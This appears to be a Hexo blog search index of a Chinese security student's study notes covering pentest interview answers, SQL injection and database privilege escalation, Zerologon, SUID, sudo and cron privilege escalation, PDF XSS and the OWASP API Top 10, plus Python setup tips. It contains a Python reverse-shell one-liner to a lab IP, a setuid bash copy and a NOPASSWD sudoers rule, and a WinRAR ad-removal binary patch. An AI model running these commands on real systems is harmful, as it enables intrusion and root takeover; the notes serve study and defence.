<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/08/10/%E9%97%AE%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
      <url>/2024/08/10/%E9%97%AE%E9%A2%98%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="同网段机器ping不通？"><a href="#同网段机器ping不通？" class="headerlink" title="同网段机器ping不通？"></a>同网段机器ping不通？</h1><p>防火墙关闭，问题未解决<br>重启未解决，<br>whireshark抓包，arp包没有回应</p><p>起因：一台nat，一台仅主机<br>修改为一致即可</p><h1 id="朴素贝叶斯理解"><a href="#朴素贝叶斯理解" class="headerlink" title="朴素贝叶斯理解"></a>朴素贝叶斯理解</h1><p>好的，让我以垃圾邮件检测为例来说明每个步骤：</p><p>假设我们有一个包含以下特征的数据集：</p><ul><li>特征：邮件中出现的单词或短语。</li><li>类别：垃圾邮件（Spam）或非垃圾邮件（Ham）。</li></ul><p>现在我们来逐步计算每个步骤：</p><ol><li><p><strong>计算先验概率</strong>：</p><p>假设我们有 1000 封邮件，其中 200 封是垃圾邮件，800 封是非垃圾邮件。那么：</p><p>$$P(\text{Spam}) &#x3D; \frac{200}{1000} &#x3D; 0.2$$<br>$$P(\text{Ham}) &#x3D; \frac{800}{1000} &#x3D; 0.8$$</p></li><li><p><strong>计算条件概率</strong>：</p><p>对于每个特征（单词或短语），计算在给定类别下的条件概率。例如，假设我们要计算单词 “offer” 在垃圾邮件和非垃圾邮件中的条件概率：</p><p>$$P(\text{“offer”}|\text{Spam}) &#x3D; \frac{\text{在垃圾邮件中 “offer” 出现的次数}}{\text{垃圾邮件总单词数}}$$</p><p>$$P(\text{“offer”}|\text{Ham}) &#x3D; \frac{\text{在非垃圾邮件中 “offer” 出现的次数}}{\text{非垃圾邮件总单词数}}$$</p><p>我们需要在训练集中统计这些频率。</p></li><li><p><strong>预测</strong>：</p><p>对于给定的一封新邮件，我们计算该邮件属于垃圾邮件和非垃圾邮件的后验概率，并选择具有最大后验概率的类别作为预测结果。例如，对于一封新邮件，我们计算：</p><p>$$P(\text{Spam}|\text{邮件内容}) &#x3D; P(\text{Spam}) \times P(\text{“offer”}|\text{Spam}) \times P(\text{其他特征}| \text{Spam})$$</p><p>$$P(\text{Ham}|\text{邮件内容}) &#x3D; P(\text{Ham}) \times P(\text{“offer”}|\text{Ham}) \times P(\text{其他特征}| \text{Ham})$$</p><p>然后，我们选择具有最大后验概率的类别作为预测结果。</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/%E9%9D%A2%E8%AF%95/"/>
      <url>/2024/08/10/%E9%9D%A2%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="1、自我介绍"><a href="#1、自我介绍" class="headerlink" title="1、自我介绍"></a>1、自我介绍</h1><p>额，面试官，下午好，我叫官志伟，来自桂林电子科技大学，专业是信息安全，在学校，主要学习的核心课程有网络渗透测试、网络安全技术、系统安全、密码学、计算机网络等，然后我的成绩是在专业前百分之二十。实习上，我在长禾南京信息科技有限公司广西分公司，实习了差不多十个月，主要做的工作是，外网信息收集打点、web渗透、以及参与一些内网项目。</p><h1 id="2、谈一下你了解那些web漏洞"><a href="#2、谈一下你了解那些web漏洞" class="headerlink" title="2、谈一下你了解那些web漏洞"></a>2、谈一下你了解那些web漏洞</h1><p>sql注入、xss、反序列化、目录遍历、弱口令、文件上传、文件包含、csrf、ssrf、ddos、逻辑漏洞等</p><h2 id="2-1-、谈一下sql注入"><a href="#2-1-、谈一下sql注入" class="headerlink" title="2.1 、谈一下sql注入"></a>2.1 、谈一下sql注入</h2><p>原理？sql注入的原理，在存在与数据库交互的输入处，对输入的数据没有进行合理的审查，导致sql语句拼接执行其他sql语句。</p><p>注入类型：<br>可以分数字型、或字符型</p><p>注入手法：<br>1）布尔盲注：True和False两个不同情况，web返回结果不一样<br>2）时间盲注：无回显，可用sleep()函数或者benchmark函数，延时返回，通过返回的时间判断<br>3）基于错误信息的注入：注入的语句不符合sql语法，它返回报错信息<br>4）联合查询注入：使用union联合查询，需要两个表的列数和数据类型一致<br>5）堆查询注入：一个分号隔断一条sql语句</p><p>sql注入拿shell的方式：<br>可以用select into outfile将一句话木马写入一个文件；<br>或者如果有对目录写入的权限，可以使用sqlmap的–os-shell拿shell；<br>或者如果拥有写备份文件的权限，并且知道网站目录且目录写，即可通过写备份文件拿shell</p><p>mysql提权的方式：<br>1）管理员弱密码<br>2）UDF 用户自定义函数提权<br>从sqlmap或者msf获取udf相关dll，将dll写入mysql的插件目录下，create funtion创建函数调用dll，执行函数即可<br>网页php脚本文件上传到网站目录，也可以直接一键提权<br>3）如果是windows系统版本比较低，还有个MOF提权，mof是windows系统的一个托管对象格式，每5分钟执行一次，监控进程的创建和死亡，提权原理是用mysql对这个文件进行写入一些恶意代码，如创建管理等。但局限很大，因为基本不会出现windows2003一下的版本系统，实战中更加难遇到<br>4）启动项提权，如果mysql有对启动项文件写入的权限，可以将恶意代码写入启动项中，让他随让系统启动而启动，一般可以获取到系统权限</p><p>sql server 提权方式:<br>系统管理员：dba<br>数据库管理者：dbo</p><p>一般需要dba权限</p><p>1）dba权限，如果是默认安装的sqlserver，其启动的账户不是系统账户，得不到系统权限<br>2）xp_cmdshell 在sqlserver 2005及之前默认开启，可以用来执行系统命令，sqlserver2019被降权为mssql权限<br>3）sqlserver 代理服务提权：可以通过创建执行计划任务，并通过将结果写入文件来回显，从而执行系统命令</p><h2 id="2-2、谈一下反序列化"><a href="#2-2、谈一下反序列化" class="headerlink" title="2.2、谈一下反序列化"></a>2.2、谈一下反序列化</h2><p>反序列化，就是对象被序列化成一个字符串，而后又从字符串反序列化为对象的过程，如果可以操控这个字符串，并且可以使用一些反序列化的魔法函数，就可以达到代码执行的效果</p><p>反序列化很多，什么java反序列化，python反序列化、php反序列化，都有，了解过的反序列化漏洞主要有apache log4j，apache shiro</p><h2 id="2-3、谈谈xss和csrf的区别"><a href="#2-3、谈谈xss和csrf的区别" class="headerlink" title="2.3、谈谈xss和csrf的区别"></a>2.3、谈谈xss和csrf的区别</h2><p>xss有哪几种？<br>反射型：恶意代码被嵌入到一个URL中，用户访问导致触发<br>存储型：恶意代码被嵌入到数据库中，用户访问相关页面，服务读取数据回馈用户时触发<br>dom型：dom元素被嵌入恶意代码，用户访问触发，意思就是访问的页面本来就有问题，导致客户端访问直接触发</p><p>csrf<br>原理是利用了网站对用户浏览器的信任，劫持用户登录身份去执行非用户本意的操作<br>即用户登录A网站，并以该网站登录身份访问了嵌入了恶意代码的链接，导致恶意代码以用户的身份执行</p><p>xss是跨站脚本攻击，csrf是跨站请求伪造<br>xss可以执行不受用户限制，csrf执行效果受限于对应用户权限<br>恶意代码嵌入位置不同，xss就在当前网站，而csrf则在第三方URL或网页<br>xss不一定要用户登录，而csrf则必须要求用户处于登录状态下</p><p>对策：<br>检查请求来源referer；<br>生成并绑定一个token；<br>请求中设置特定的参数，并在服务端进行验证</p><h2 id="2-4、csrf和ssrf的区别"><a href="#2-4、csrf和ssrf的区别" class="headerlink" title="2.4、csrf和ssrf的区别"></a>2.4、csrf和ssrf的区别</h2><p>ssrf是服务器请求伪造，是由于服务器允许从第三方服务器获取数据的功能，但未对相应的请求或URL进行哈法性审核导致的漏洞，其可以使得攻击者可以探测内网，获取服务器文件，甚至直接通过服务器向内网发送payload</p><p>ssrf是由服务端发起，csrf则是由用户浏览器发起<br>执行的目的不同，ssrf主要是探测内网，而csrf则是劫持用户</p><h2 id="2-5、文件上传和文件包含的区别？"><a href="#2-5、文件上传和文件包含的区别？" class="headerlink" title="2.5、文件上传和文件包含的区别？"></a>2.5、文件上传和文件包含的区别？</h2><p>文件上传：即对上传的文件没有进行类型校验，或校验可以被轻易绕过，导致攻击者可以上传shell脚本文件。<br>此时攻击者可以结合一些文件解析漏洞来执行shell文件：<br>apache<br>2.4.0-2.4.29 换行解析漏洞 \n换行<br>1.x 2.x 多后缀解析漏洞 .php.qwe</p><p>IIS<br>6.0 文件解析漏洞 .asp: . jpg 分号后面的不会被解析<br>目录解析漏洞 .asp&#x2F;1.jpg .asp目录下的文件都会被解析成asp文件<br>7.0 CGI 解析漏洞 .jpg&#x2F;.php</p><p>Nginx<br>1.5.0-1.5.7 0.8.4-1.4.3 文件名逻辑解析漏洞 webshell.jpg空格 .访问 webshell&#x2F;jpg%00.php 原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。<br>0.5 0.6 0.7 %00截断</p><p>文件包含：<br>文件包含漏洞是指应用程序未对用户输入的文件路径或文件名进行充分的验证和过滤，导致攻击者可以通过向应用程序发送恶意文件路径或文件名来获取敏感信息或执行恶意代码的漏洞</p><h1 id="3、渗透测试的基本流程"><a href="#3、渗透测试的基本流程" class="headerlink" title="3、渗透测试的基本流程"></a>3、渗透测试的基本流程</h1><p>获取授权<br>信息收集：fofa资产收集、子域名、信任域、框架、组件、js泄露、github泄露<br>漏洞探索：历史漏洞<br>漏洞验证：验证漏洞是否存在<br>漏洞利用：获取数据，体现危害<br>整理并书写渗透测试报告</p><h1 id="4、复现过什么漏洞？"><a href="#4、复现过什么漏洞？" class="headerlink" title="4、复现过什么漏洞？"></a>4、复现过什么漏洞？</h1><p>zerologon<br>netlogon认证过程，客户端可以通过设置特定标志位关闭签名校验，而后利用ComputeNetlogonCredential 函数的缺陷配合AES-128及CFB8分组模式，可以在设定特定明文全为0情况下，通过发送大量ClientCredential认证请求，直至服务器那端计算出来的密文 hash 也全是 0，使得认证通过。<br>认证通过之后，就可以调用 RPC 函数中的 NetrServerPasswordSet2 (Opnum 30) 方法将 DC 的机器账号的密码重置为 0。（NetrServerPasswordSet2 方法允许客户端为域控制器使用的帐户设置一个新的明文密码）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/%E5%85%8D%E6%9D%80/"/>
      <url>/2024/08/10/%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="杀软检测的原理？"><a href="#杀软检测的原理？" class="headerlink" title="杀软检测的原理？"></a>杀软检测的原理？</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83/"/>
      <url>/2024/08/10/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>原理：某个计划任务是以root身份执行的，而这个计划任务执行的文件又是普通用户可以修改的，此时修改计划任务的文件内容，改为敏感提权操作，即可达到提权的目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/bash; chmod u+s /tmp/bash;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/winrar%E5%8E%BB%E6%8E%89%E5%B9%BF%E5%91%8A/"/>
      <url>/2024/08/10/winrar%E5%8E%BB%E6%8E%89%E5%B9%BF%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>Winrar 解压缩比7z好用，唯一缺点就是有广告</p><h2 id="1）工具Resource-Hack"><a href="#1）工具Resource-Hack" class="headerlink" title="1）工具Resource Hack"></a>1）工具Resource Hack</h2><p>可用于查看、添加、修改或替换 Windows 二进制文件中的大多数资源，包括字符串、图像、对话框、菜单、VersionInfo 和 Manifest 资源。<br><a href="https://www.angusj.com/resourcehacker/#download">https://www.angusj.com/resourcehacker/#download</a></p><h2 id="2）Winrar下载"><a href="#2）Winrar下载" class="headerlink" title="2）Winrar下载"></a>2）Winrar下载</h2><p>这个从腾讯管家的，官网或其他途径下载的未测，但理论上都可以。</p><h2 id="3"><a href="#3" class="headerlink" title="3)"></a>3)</h2><p>Resource Hack 打开Winrar.exe，String Table-&gt; 80 -&gt;1277 删掉1277该行代码即可<br><img src="/png/Pasted%20image%2020240205210131.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/sudo%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/"/>
      <url>/2024/08/10/sudo%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>原理：配置&#x2F;etc&#x2F;sudoers文件设置特定的账户免密码进行sudo即可进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">caixiaoguan ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure><p><img src="/png/Pasted%20image%2020240225202746.png"></p><p>如果有下面这条规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%sudoALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>需要改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%sudoALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure><p>否则sudo还是需要密码</p><p><img src="/png/Pasted%20image%2020240225213150.png"></p><p>查询sudo组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &#x27;^sudo:&#x27; /etc/group</span><br></pre></td></tr></table></figure><p>将用户添加进sudo组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG sudo &lt;用户名&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/suid%E6%8F%90%E6%9D%83/"/>
      <url>/2024/08/10/suid%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>Suid（Set User ID）赋予可执行文件的所有者的权限，给可执行文件执行，即可执行文件短暂拥有该文件所有者的权限。（仅限二进制文件，脚本shell文件无效）</p><p>当 SUID 位被设置在一个可执行文件上时，该文件将以文件所有者的权限来执行，而不是调用它的用户的权限。<br>具体来说，如果一个文件的 SUID 位被设置，那么当一个用户执行这个文件时，该程序将以文件所有者的权限来运行，而不是当前用户的权限。</p><h1 id="常见可利用可执行文件"><a href="#常见可利用可执行文件" class="headerlink" title="常见可利用可执行文件"></a>常见可利用可执行文件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">find</span><br><span class="line">vim</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>环境设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s /usr/bin/find  设置suid权限</span><br><span class="line">chmod u-s /usr/bin/find  删除suid权限</span><br></pre></td></tr></table></figure><h2 id="1）查找隶属于root的Suid文件"><a href="#1）查找隶属于root的Suid文件" class="headerlink" title="1）查找隶属于root的Suid文件"></a>1）查找隶属于root的Suid文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/png/Pasted%20image%2020240224012619.png"><br><img src="/png/Pasted%20image%2020240224012645.png"></p><h2 id="2）find利用实例"><a href="#2）find利用实例" class="headerlink" title="2）find利用实例"></a>2）find利用实例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch 1</span><br><span class="line">find 1 -exec whoami \;</span><br><span class="line">find 1 -exec /bin/sh -p \;</span><br></pre></td></tr></table></figure><p><img src="/png/Pasted%20image%2020240224013421.png"></p><p><img src="/png/Pasted%20image%2020240224164417.png"><br>反弹获取root shell失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/find 1 -exec python3 -c  &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.88.128&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; \;</span><br></pre></td></tr></table></figure><p><img src="/png/Pasted%20image%2020240224020038.png"></p><p><img src="/png/Pasted%20image%2020240224170515.png"></p><h1 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h1><p><a href="https://blog.csdn.net/CoreNote/article/details/122093180?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170876216616800215081483%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=170876216616800215081483&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-122093180-null-null.nonecase&utm_term=suid%E6%8F%90%E6%9D%83&spm=1018.2226.3001.4450">https://blog.csdn.net/CoreNote/article/details/122093180?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170876216616800215081483%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=170876216616800215081483&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-122093180-null-null.nonecase&amp;utm_term=suid%E6%8F%90%E6%9D%83&amp;spm=1018.2226.3001.4450</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/spacy%E5%8C%85%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/08/10/spacy%E5%8C%85%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>spacy使用过程中需要导入语言模型，对应需要spacy的版本为3.7.0-3.8.0<br>语言模型下载地址：<a href="https://spacy.io/models/zh">https://spacy.io/models/zh</a></p><p><img src="/png/Pasted%20image%2020240215001456.png"></p><p>下载后使用命令安装即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install zh_core_web_sm-3.7.0-py3-none-any.whl</span><br></pre></td></tr></table></figure><p><img src="/png/Pasted%20image%2020240215001724.png"></p><p>整个过程中遇到的问题：<br>1）安装spacy失败（换源解决）<br>2）直接用命令安装，失败<br><img src="/png/Pasted%20image%2020240215002103.png"><br>以下文章给出了解决方案，同样是源的问题（已解决最终目的，文章方法未尝试，但应该是可行的）：<br><a href="https://blog.csdn.net/qjyws/article/details/127633034">https://blog.csdn.net/qjyws/article/details/127633034</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/python%E5%BA%93%E8%BF%81%E7%A7%BB/"/>
      <url>/2024/08/10/python%E5%BA%93%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p>项目迁移最重要的就是库，尤其是新的python环境，重新下载库很麻烦。</p><h2 id="1）找到之前的库"><a href="#1）找到之前的库" class="headerlink" title="1）找到之前的库"></a>1）找到之前的库</h2><p>从解释器路径定位site-packages，或者从pycharm-&gt;file-&gt;setting-&gt;project-&gt;python interpreter -&gt;鼠标放到软件包上会显示其路径（新版本无显示）<br><img src="/png/Pasted%20image%2020240205013659.png"></p><h2 id="2）复制替换"><a href="#2）复制替换" class="headerlink" title="2）复制替换"></a>2）复制替换</h2><p>将整个site-packages复制替换掉新的解释器的site-packages即可<br><img src="/png/Pasted%20image%2020240205014824.png"></p><h2 id="关于python环境配置问题"><a href="#关于python环境配置问题" class="headerlink" title="关于python环境配置问题"></a>关于python环境配置问题</h2><h3 id="1）下载python"><a href="#1）下载python" class="headerlink" title="1）下载python"></a>1）下载python</h3><p><a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a><br>选需要的版本，选windows installer下载后得到一个exe，运行时会有一个环境变量自动配置选项，傻瓜式配置 ；选Windows embeddable package下载后得到一个压缩包，解压后需要手动添加环境变量<br><img src="/png/Pasted%20image%2020240205015150.png"></p><h3 id="2）设置系统变量"><a href="#2）设置系统变量" class="headerlink" title="2）设置系统变量"></a>2）设置系统变量</h3><p>计算机-&gt;属性-&gt;高级系统设置-&gt;环境变量-&gt;用户环境变量（即可）-&gt;path-&gt;将python.exe的父级路径复制上去即可<br><img src="/png/Pasted%20image%2020240205020231.png"></p><p><img src="/png/Pasted%20image%2020240205020248.png"></p><h2 id="关于cmd运行python跳出微软商店的问题"><a href="#关于cmd运行python跳出微软商店的问题" class="headerlink" title="关于cmd运行python跳出微软商店的问题"></a>关于cmd运行python跳出微软商店的问题</h2><p>环境变量删除Windowsapp即可，或者下移动</p><h2 id="关于python项目迁移的注意点"><a href="#关于python项目迁移的注意点" class="headerlink" title="关于python项目迁移的注意点"></a>关于python项目迁移的注意点</h2><p>不要试图将整个python环境搬过来，不然可能会有错误，比如路径还是原来机子的路径，同时还会受到.venv的影响（用于存储虚拟环境（virtual environment）的相关数据。虚拟环境是Python的一个非常有用的特性，允许用户为每个项目创建独立的环境，这些环境各自拥有独立的Python解释器和一组库。），最好就是只迁移库就行。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/pycharm%20%E6%9B%B4%E6%8D%A2%E6%BA%90/"/>
      <url>/2024/08/10/pycharm%20%E6%9B%B4%E6%8D%A2%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<p>安装了最新版的pycharm 2023.3.3，换下载源位置变化，很懵，故此记录一下</p><p> 1）左下角 python packages , 设置<br><img src="/png/Pasted%20image%2020240215000323.png"></p><p>2）输入源地址即可（要使用https，否则会出现不信任源而报错的情况）<br><img src="/png/Pasted%20image%2020240215000436.png"></p><p>3）常见源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1) http://mirrors.aliyun.com/pypi/simple/    阿里云</span><br><span class="line">2) https://pypi.mirrors.ustc.edu.cn/simple/ 中国科技大学</span><br><span class="line">3) http://pypi.douban.com/simple/    豆瓣</span><br><span class="line">4) https://pypi.tuna.tsinghua.edu.cn/simple/   清华大学 </span><br><span class="line">5) http://pypi.mirrors.ustc.edu.cn/simple/ 中国科学技术大学</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/PDF%20xss/"/>
      <url>/2024/08/10/PDF%20xss/</url>
      
        <content type="html"><![CDATA[<p>学了那么久的xss，偶然间看到一个pdf xss，觉得有意思，记录一下</p><p>1）使用pdf编辑器打开或创建一个pdf 文档，视图-&gt;页面缩略图-&gt;点击缩略图-&gt;属性-&gt;动作-&gt;新增-&gt;写入代码<br><img src="/png/Pasted%20image%2020240213002040.png"></p><p>2）访问测试<br><img src="/png/Pasted%20image%2020240213002150.png"></p><p><strong>测试时为啥是app.alert()而不是直接用alert()?</strong></p><p>Adobe 支持自身的 JavaScript 对象模型，因此在使用 JavaScript 进行编程时，需要使用Adobe提供的特定对象和方法。举例来说，原本在一般的JavaScript环境中可以直接使用 <code>alert(&#39;xss&#39;)</code> 来显示一个警告框，但在Adobe的环境下，必须通过 <code>app.alert(&#39;xss&#39;)</code> 的形式来调用警告框。这意味着，如果想要利用JavaScript进行攻击，只能使用Adobe软件所支持的功能，因为其他普通的JavaScript语法和功能可能无法在Adobe环境下执行。换句话说，Adobe限制了JavaScript的某些功能，只允许使用特定的函数和对象，这样可以防止恶意使用不安全的JavaScript功能来攻击Adobe软件。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/owasp%20top%2010/"/>
      <url>/2024/08/10/owasp%20top%2010/</url>
      
        <content type="html"><![CDATA[<h1 id="对象级授权失效"><a href="#对象级授权失效" class="headerlink" title="对象级授权失效"></a>对象级授权失效</h1><p>即失效的访问控制，常发生在api中，比如某api中存在用户id，更换这个用户id去访问便可以访问甚至操作其他用户的资源</p><p>对策：<br>加强访问控制，比如用户登录后给一个临时的带有随机字符串身份标识，所有的访问都基于这个身份标识去验证。</p><h1 id="用户身份验证失效"><a href="#用户身份验证失效" class="headerlink" title="用户身份验证失效"></a>用户身份验证失效</h1><p>存在SQL注入的万能密码；<br>可暴力破解；<br>默认账号密码；<br>无效的密码重置，某系统存在用身份证号进行重置；<br>某系统测试中，存在api访问获取身份属性，而后拼接URL以某在线用户状态进入登录状态；</p><p>对策：<br>双因子<br>参数化输入<br>限定密码尝试次数，账号锁定策略</p><h1 id="对象级属性授权失效"><a href="#对象级属性授权失效" class="headerlink" title="对象级属性授权失效"></a>对象级属性授权失效</h1><p>服务端可以接受来自客户端的设置特定属性的请求包，比如本来这个请求是不被允许的，但在相关属性上设置为True或者False它就可以被正常处理。</p><p>还有一种情况，就是域环境中的dcsync功能，这本应该是域管理才能授予的权限，但是exchange机器用户也可以进行，这意味着如果exchange被植入了shell，并被成功提取机器hash，那么攻击者就可以接管整个域。</p><p>对策：<br>拒绝外部请求的属性设置<br>对用户的属性授权进行严格限定，只允许特定用户进行属性授权。</p><h1 id="资源消耗不受限制"><a href="#资源消耗不受限制" class="headerlink" title="资源消耗不受限制"></a>资源消耗不受限制</h1><p>就ddos攻击，比如合法请求可以不受限制重放，短信api调用请求重放；<br>某个访问操作会消耗服务器资源，而这个访问可以不受限制，即无限次发送</p><p>对策：<br>限定客户端访问频率<br>流量监控</p><h1 id="功能级授权失效"><a href="#功能级授权失效" class="headerlink" title="功能级授权失效"></a>功能级授权失效</h1><p>额，管理的功能，普通用户也能用？比如管理界面普通用户也可以访问到，类似<a href="http://xxx.xx/admin/all/id%EF%BC%8C%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%BF%99%E4%B8%AAURL%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%EF%BC%8C%E8%99%BD%E7%84%B6%E6%98%8E%E9%9D%A2%E4%B8%8A%E6%B2%A1%E6%9C%89%E8%BF%99%E4%B8%AA%E5%8A%9F%E8%83%BD%E6%8C%89%E9%92%AE%E3%80%82">http://xxx.xx/admin/all/id，普通用户也可以直接对这个URL进行访问，虽然明面上没有这个功能按钮。</a></p><p>对策：<br>这个即要做好类似基于角色的访问控制策略，那个角色有那些功能要明确好，并且做好限制</p><h1 id="敏感业务流的无限制访问"><a href="#敏感业务流的无限制访问" class="headerlink" title="敏感业务流的无限制访问"></a>敏感业务流的无限制访问</h1><p>类似黄牛抢票，脚本自动抢票，肯定比人工快，然后再将抢到的票高价出售。正如标题所示，无限制访问。还有就是刷屏，看直播时会出现刷屏的情况，这也是没做限制</p><p>对策：<br>反人类检测：零点几秒完成的多次操作，禁止<br>对一些代理商ip进行封禁</p><h1 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h1><p>服务端提供了向其他第三方或应用程序获取数据的功能，且服务端对客户端的请求URL进行有效验证。</p><p>第三方api调用，一般会以URL形势调用<br>图片加载与下载</p><p>危害：<br>内网扫描<br>获取服务端文件</p><p>绕过：</p><ol><li>更改IP地址写法：一些SSRF防御会用正则表达式过滤掉内网IP，而我们也可通过修改进制格式进行绕过。</li><li>通过解析到内网的域名进行绕过。</li><li>构造短地址跳转。</li><li>Dns重绑定：域名a.com指向攻击者的DNS Server，DNS Server解析服务中将TTL设置为0（服务端对域名解析，得到一个非内网IP，验证通过后对url进行访问，由于DNS Server设置的TTL是0，所以会再次进行解析，而这一次DNS server返回的是内网地址，且服务端此时已经信任了这个url）</li><li>利用特殊字符域名（也称国际化域名IDN）进行等价转换。如ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 和 example.com是等价的<br>对策：</li><li>过滤返回信息（没有返回信息，自然就没有危险）</li><li>限制请求的端口（跟设置防火墙策略一个道理吧）</li><li>禁止不常用的协议（如获取本地计算机文件的file协议，gopher协议）</li><li>统一错误信息（探测内网信息时，如端口不开放时会返回错误信息，供攻击者判断端口开放与否，将错误信息统一可以阻止这种情况）</li><li>添加黑白名单（例如将存在内网IP的url列如黑名单中）</li></ol><h1 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h1><h1 id="库存管理不当"><a href="#库存管理不当" class="headerlink" title="库存管理不当"></a>库存管理不当</h1><h1 id="api的不安全使用"><a href="#api的不安全使用" class="headerlink" title="api的不安全使用"></a>api的不安全使用</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/office%E6%BF%80%E6%B4%BB/"/>
      <url>/2024/08/10/office%E6%BF%80%E6%B4%BB/</url>
      
